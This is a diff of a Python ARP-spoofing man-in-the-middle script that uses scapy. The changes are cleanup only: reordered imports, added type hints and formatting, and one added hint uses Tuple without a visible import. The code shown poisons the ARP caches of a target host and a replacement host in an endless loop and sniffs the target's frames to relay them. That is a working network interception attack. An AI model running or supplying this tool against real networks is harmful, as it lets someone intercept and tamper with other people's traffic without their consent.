@@ -2,11 +2,9 @@ import argparse
 import re
 import threading
 
-from scapy.all import send, AsyncSniffer
+from scapy.all import AsyncSniffer, conf
 from scapy.arch import get_if_hwaddr
 from scapy.layers.l2 import ARP, Ether
-from scapy.all import conf
-from scapy.packet import Packet
 from scapy.sendrecv import srp, sendp
 
 
@@ -29,6 +27,7 @@ def get_mac(ip: str) -> str:
     received_packet = first_answer[1]
 
     return received_packet.hwsrc
+
 
 def process_frame_from_target(own_mac_address: str, frame: Ether, host_mac: str) -> None:
     """
@@ -67,19 +66,18 @@ def active_spoofing(src_ip: str, dst_ip: str, dst_mac: str) -> None:
     sendp(spoof_packet, verbose=False)
 
 
-def active_spoofing_both_sides(target_host_ip, target_host_mac, replace_host_ip, replace_host_mac):
+def active_spoofing_both_sides(target_host_ip: str, target_host_mac: str, replace_host_ip: str, replace_host_mac: str) -> None:
     """
     :param target_host_ip: The target host's IP
     :param target_host_mac: The target host's MAC
     :param replace_host_ip: The replacement host's IP
     :param replace_host_mac: The replacement host's MAC
-    :return:
     """
     while True:
         active_spoofing(target_host_ip, replace_host_ip, replace_host_mac)
         active_spoofing(replace_host_ip, target_host_ip, target_host_mac)
 
-def valid_ip(value):
+def valid_ip(value: str) -> str:
     """
     Gets a value, and checks if the value follows the IP format.
     :param value: The value we want to check.
@@ -92,7 +90,7 @@ def valid_ip(value):
         raise argparse.ArgumentTypeError(f"{value} is not a valid IP address")
 
 
-def get_args():
+def get_args() -> Tuple[str, str]:
     """
     Receives the arguments passed when running the script
     :return: Tuple[str, str] - target host ip & replace host ip
@@ -134,5 +132,5 @@ def main():
     sniff_to_target.join()
 
 
-if __name__ == "__main__":
+if __name__ == "__main__":  
     main()
